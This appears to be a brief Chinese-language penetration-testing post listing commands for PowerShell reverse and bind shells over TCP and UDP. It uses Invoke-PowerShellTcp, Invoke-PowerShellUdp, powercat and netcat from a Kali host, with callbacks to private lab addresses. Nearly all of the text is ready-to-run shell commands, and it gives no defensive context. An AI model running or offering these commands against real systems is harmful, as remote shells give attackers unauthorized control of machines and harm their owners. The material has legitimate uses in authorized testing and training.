主要介绍几种常用的, http/dns/imcp这些大家百度  不太想说太复杂了。。。。

`TCP Reverse`

    PS F:\Shells> . .\Invoke-PowerShellTcp.ps1
    PS F:\Shells> Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444
`TCP Bind`

        PS F:\Shells> . .\Invoke-PowerShellTcp.ps1
        PS F:\Shells> Invoke-PowerShellTcp -Bind -Port 8888
        PS F:\Shells> . .\powercat.ps1
        PS F:\Shells> powercat -c 192.168.52.1 -v -p 8888
`UDP Reverse`
        
        PS F:\Shells> . .\Invoke-PowerShellUdp.ps1
        PS F:\Shells> Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53
`UDP Bind`

        PS F:\Shells> . .\Invoke-PowerShellUdp.ps1
        PS F:\Shells> Invoke-PowerShellUdp -Bind -Port 7777
        
        root@kali:~# nc -vtu 目标IP 7777
        
